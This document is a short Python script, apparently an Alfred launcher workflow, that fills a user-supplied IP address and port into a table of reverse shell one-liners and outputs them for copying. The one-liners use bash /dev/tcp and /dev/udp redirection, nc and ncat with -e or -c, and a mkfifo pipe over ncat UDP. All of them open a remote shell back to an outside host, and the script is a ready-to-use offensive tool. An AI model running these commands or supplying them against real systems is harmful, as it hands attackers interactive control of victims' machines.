import json
import sys

payload_mapping = {
    "bash": "bash -i >& /dev/tcp/{0}/{1} 0>&1",
    "bash 5": "bash -i 5<> /dev/tcp/{0}/{1} 0<&5 1>&5 2>&5",
    "bash udp": "bash -i >& /dev/udp/{0}/{1} 0>&1",
    "nc -e": "nc -e sh {0} {1}",
    "nc.exe -e": "nc.exe -e sh {0} {1}",
    "nc -c": "nc -c sh {0} {1}",
    "ncat -e": "ncat {0} {1} -e sh",
    "ncat.exe -e": "ncat.exe {0} {1} -e sh",
    "ncat udp": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {0} {1} >/tmp/f"
}


def alfred_output(items):
    print(json.dumps({"items": items}))


def main():
    items = []
    try: 
        ip, port = sys.argv[1].split()
        for k, v in payload_mapping.items():
            payload = v.format(ip, port)
            items.append({
                "title": k,
                "subtitle": payload,
                "arg": payload
            })
        alfred_output(items)    
    except ValueError:
        pass

if __name__ == '__main__':
    main()
